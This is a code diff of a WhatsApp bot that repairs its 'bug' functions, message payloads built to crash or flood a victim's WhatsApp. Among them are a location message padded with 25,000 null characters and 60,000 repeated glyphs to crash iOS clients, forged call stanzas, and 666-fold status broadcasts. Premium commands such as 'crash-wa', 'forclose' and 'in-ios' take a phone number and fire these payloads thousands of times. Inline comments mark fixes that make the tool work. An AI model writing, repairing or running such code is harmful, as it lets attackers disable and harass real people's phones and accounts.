@@ -15,6 +15,7 @@ const util = require('util')
 const chalk = require('chalk')
 const { addPremiumUser, delPremiumUser } = require("./lib/premium");
 const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
+const crypto = require('crypto');
 //===============
 module.exports = rikz = async (rikz, m, chatUpdate, store) => {
 try {
@@ -65,7 +66,8 @@ console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`$
 console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
 console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
 //FUNCTION BUG
-async function XProtexHardCore(target) {
+// Replace the entire XProtexHardCore function with this:
+async function XProtexHardCore(rikz, target) {
  try {
   const cards = [];
   const header = {
@@ -228,7 +230,8 @@ async function XProtexHardCore(target) {
     throw err;
   }
 }
-async function FloodUIxFC(target) {
+// Replace the entire FloodUIxFC function with this:
+async function FloodUIxFC(rikz, target) {
   const floodXMention = [
     "0@s.whatsapp.net",
     "13135550002@s.whatsapp.net",
@@ -297,7 +300,7 @@ async function FloodUIxFC(target) {
 
     try {
       const msg = generateWAMessageFromContent(target, mediaFlood, {});
-      await sock.relayMessage(target, msg.message, {
+      await rikz.relayMessage(target, msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
       });
@@ -306,12 +309,12 @@ async function FloodUIxFC(target) {
     }
   }
 }
-async function sbh(target) {
+async function sbh(rikz, target) {  // ← ADD rikz as parameter
   const sbh = [
     {
       tag: 'call',
       attrs: {
-        from: client.user.id,
+        from: rikz.user.id,  // ← CHANGE: client → rikz
         to: true,
         id: '1234567890ABCDEF',
       },
@@ -389,7 +392,7 @@ async function sbh(target) {
             ]
           },
           contextInfo: {
-            stanzaId: client.generateMessageTag(),
+            stanzaId: rikz.generateMessageTag(),  // ← CHANGE: client → rikz
             participant: target,
             remoteJid: "@s.whatsapp.net",
             mentionedJid: [ target,
@@ -426,9 +429,9 @@ async function sbh(target) {
   console.log(`SUCCESS SEND BUGS FORCECLOSE SBH`);
 }
 
-async function urlbugs(target) {
+async function urlbugs(rikz, target) {
   try {
-    await lalz.relayMessage(target, {
+    await rikz.relayMessage(target, {
       locationMessage: {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
@@ -446,7 +449,7 @@ async function urlbugs(target) {
   }
 }
 
-async function protocolbug8(target, mention) {
+async function protocolbug8(rikz, target, mention) {  // ← ADD rikz parameter
   const photo = {
     image: { url: "https://img1.pixhost.to/images/6867/616928797_nier.png"},
     caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
@@ -459,14 +462,14 @@ async function protocolbug8(target, mention) {
     }
   }, {
     userJid: target,
-    upload: lalz.waUploadToServer
+    upload: rikz.waUploadToServer  // ← CHANGE: lalz → rikz
   });
 
-  await lalz.relayMessage(target, album.message, { messageId: album.key.id });
+  await rikz.relayMessage(target, album.message, { messageId: album.key.id });  // ← CHANGE: lalz → rikz
 
   for (let i = 0; i < 666; i++) { // ubah ke 100 / 10 kalau g ke kirim
     const msg = await generateWAMessage(target, photo, {
-      upload: lalz.waUploadToServer
+      upload: rikz.waUploadToServer  // ← CHANGE: lalz → rikz
     });
 
     const type = Object.keys(msg.message).find(t => t.endsWith('Message'));
@@ -491,7 +494,7 @@ async function protocolbug8(target, mention) {
       }
     };
 
-    await lalz.relayMessage("status@broadcast", msg.message, {
+    await rikz.relayMessage("status@broadcast", msg.message, {  // ← CHANGE: lalz → rikz
       messageId: msg.key.id,
       statusJidList: [target],
       additionalNodes: [
@@ -512,7 +515,7 @@ async function protocolbug8(target, mention) {
     });
 
     if (mention) {
-      await lalz.relayMessage(target, {
+      await rikz.relayMessage(target, {  // ← CHANGE: lalz → rikz
         statusMentionMessage: {
           message: { protocolMessage: { key: msg.key, type: 25 } }
         }
@@ -525,176 +528,152 @@ async function protocolbug8(target, mention) {
   }
 }
 
-async function CrashIos(target) {
- 
-    await sock.relayMessage(
-      target,
-      {
-        locationMessage: {
-          degreesLatitude: 21.1266,
-          degreesLongitude: -11.8199,
-          name: " ‼️⃟𝕾𝖓𝒊𝖙̦̾𝖍͢ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱\n" + "\u0000".repeat(25000) + "𑇂𑆵𑆴𑆿".repeat(60000),
-          url: "https://t.me/Snitchezs",
-          contextInfo: {
-            externalAdReply: {
-              quotedAd: {
-                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
-                mediaType: "IMAGE",
-                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
-                caption: " ‼️⃟𝕾̷⃰𝖓𝒊𝖙̦͈͈͈͈̾𝖍͢ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱" + "𑇂𑆵𑆴𑆿".repeat(60000),
-              },
-              placeholderKey: {
-                remoteJid: "0s.whatsapp.net",
-                fromMe: false,
-                id: "ABCDEF1234567890"
-              }
+async function CrashIos(rikz, target) {  // ← ADD rikz parameter
+  await rikz.relayMessage(
+    target,
+    {
+      locationMessage: {
+        degreesLatitude: 21.1266,
+        degreesLongitude: -11.8199,
+        name: " ‼️⃟𝕾𝖓𝒊𝖙̦̾𝖍͢ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱\n" + "\u0000".repeat(25000) + "𑇂𑆵𑆴𑆿".repeat(60000),
+        url: "https://t.me/Snitchezs",
+        contextInfo: {
+          externalAdReply: {
+            quotedAd: {
+              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
+              mediaType: "IMAGE",
+              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
+              caption: " ‼️⃟𝕾̷⃰𝖓𝒊𝖙̦͈͈͈͈̾𝖍͢ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱" + "𑇂𑆵𑆴𑆿".repeat(60000),
+            },
+            placeholderKey: {
+              remoteJid: "0s.whatsapp.net",
+              fromMe: false,
+              id: "ABCDEF1234567890"
             }
           }
         }
-      },
-      {
-        participant: { jid: target }
       }
-    );
-  }
+    },
+    {
+      participant: { jid: target }
+    }
+  );
+}
 
 //======================
 switch (command) {
 //case bug
 case "Trinity-fc": {
-
-if (!isPremium) return m.reply('Premium Only');
-
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
-
-target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-
-m.reply(`*[!] ✅ Bug submitted successfully.
-
-⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
-
-          for (let i = 0; i < 870; i++) {
-           await XProtexHardCore(target)
-           await XProtexHardCore(target)
-           await XProtexHardCore(target)
-           await XProtexHardCore(target)
-           await XProtexHardCore(target)
-           await XProtexHardCore(target)
-           await XProtexHardCore(target)
-        }
-    }
+    if (!isPremium) return m.reply('Premium Only');
+    if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
+    target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
+    m.reply(`*[!] ✅ Bug submitted successfully...`);
+    
+    for (let i = 0; i < 870; i++) {
+        await XProtexHardCore(rikz, target)  // ✅ CORRECT
+        await XProtexHardCore(rikz, target)
+        await XProtexHardCore(rikz, target)
+        await XProtexHardCore(rikz, target)
+        await XProtexHardCore(rikz, target)
+        await XProtexHardCore(rikz, target)
+        await XProtexHardCore(rikz, target)
+    }
+}
 break;
+
 case "crash-wa": {
-
-if (!isPremium) return m.reply('Premium Only');
-
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
-
-target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-
-m.reply(`*[!] ✅ Bug submitted successfully.
-
-⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
-
-          for (let i = 0; i < 870; i++) {
-           await FloodUIxFC(target)
-           await FloodUIxFC(target)
-           await FloodUIxFC(target)
-           await FloodUIxFC(target)
-           await FloodUIxFC(target)
-           await FloodUIxFC(target)
-           await FloodUIxFC(target)
-        }
-    }
+    if (!isPremium) return m.reply('Premium Only');
+    if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
+    target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
+    m.reply(`*[!] ✅ Bug submitted successfully...`);
+    
+    for (let i = 0; i < 870; i++) {
+        await FloodUIxFC(rikz, target)  // ✅ FIXED: Remove .call()
+        await FloodUIxFC(rikz, target)
+        await FloodUIxFC(rikz, target)
+        await FloodUIxFC(rikz, target)
+        await FloodUIxFC(rikz, target)
+        await FloodUIxFC(rikz, target)
+        await FloodUIxFC(rikz, target)
+    }
+}
 break;
+
 case "in-blank": {
-
-if (!isPremium) return m.reply('Premium Only');
-
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
-
-target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-
-m.reply(`*[!] ✅ Bug submitted successfully.
-
-⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
-
-          for (let i = 0; i < 870; i++) {
-           await urlbugs(target)
-           await urlbugs(target)
-           await urlbugs(target)
-           await urlbugs(target)
-           await urlbugs(target)
-           await urlbugs(target)
-           await urlbugs(target)
-        }
-    }
+    if (!isPremium) return m.reply('Premium Only');
+    if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
+    target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
+    m.reply(`*[!] ✅ Bug submitted successfully...`);
+     for (let i = 0; i < 870; i++) {
+        await urlbugs(rikz, target)
+        await urlbugs(rikz, target)
+        await urlbugs(rikz, target)
+        await urlbugs(rikz, target)
+        await urlbugs(rikz, target)
+        await urlbugs(rikz, target)
+        await urlbugs(rikz, target)
+     }
+}
 break;
+
 case "forclose": {
+    if (!isPremium) return m.reply('Premium Only');
+    if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
+    target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
-if (!isPremium) return m.reply('Premium Only');  
+    m.reply(`*[!] ✅ Bug submitted successfully...`);
     
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234���`);
-target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-m.reply(`*[!] ✅ Bug submitted successfully.
-
-⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
-          for (let i = 0; i < 879; i++) {
-           await sbh(target)
-           await sbh(target)
-           await sbh(target)
-           await sbh(target)
-           await sbh(target)
-           await sbh(target)
-           await sbh(target)
-        }
+    for (let i = 0; i < 879; i++) {
+        await sbh(rikz, target)  // ✅ CORRECT
+        await sbh(rikz, target)
+        await sbh(rikz, target)
+        await sbh(rikz, target)
+        await sbh(rikz, target)
+        await sbh(rikz, target)
+        await sbh(rikz, target)
     }
-    
+}
 break;
+
 case "protoxinfi": {
+    if (!isPremium) return m.reply('Premium Only');
+    if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
+    target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
-if (!isPremium) return m.reply('Premium Only');  
+    m.reply(`*[!] ✅ Bug submitted successfully...`);
     
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234���`);
-target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-m.reply(`*[!] ✅ Bug submitted successfully.
-
-⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
-          for (let i = 0; i < 879; i++) {
-           await protocolbug8(target)
-           await protocolbug8(target)
-           await protocolbug8(target)
-           await protocolbug8(target)
-           await protocolbug8(target)
-           await protocolbug8(target)
-           await protocolbug8(target)
-        }
+    for (let i = 0; i < 879; i++) {
+        await protocolbug8(rikz, target)  // ✅ FIXED: Add rikz
+        await protocolbug8(rikz, target)
+        await protocolbug8(rikz, target)
+        await protocolbug8(rikz, target)
+        await protocolbug8(rikz, target)
+        await protocolbug8(rikz, target)
+        await protocolbug8(rikz, target)
     }
-    
+}
 break;
-case "in-ios": {
-    
-if (!isPremium) return m.reply('Premium Only');  
-    
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234���`);
-target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-m.reply(`*[!] ✅ Bug submitted successfully.
 
-⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
-          for (let i = 0; i < 879; i++) {
-           await CrashIos(target)
-           await CrashIos(target)
-           await CrashIos(target)
-           await CrashIos(target)
-           await CrashIos(target)
-           await CrashIos(target)
-           await CrashIos(target)
-        }
-    }
+case "in-ios": {
+    if (!isPremium) return m.reply('Premium Only');
+    if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
+    target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
+    m.reply(`*[!] ✅ Bug submitted successfully...`);
+    
+    for (let i = 0; i < 879; i++) {
+        await CrashIos(rikz, target)  // ✅ CORRECT
+        await CrashIos(rikz, target)
+        await CrashIos(rikz, target)
+        await CrashIos(rikz, target)
+        await CrashIos(rikz, target)
+        await CrashIos(rikz, target)
+        await CrashIos(rikz, target)
+    }
+}
 break;
 //======================
 case 'public': {
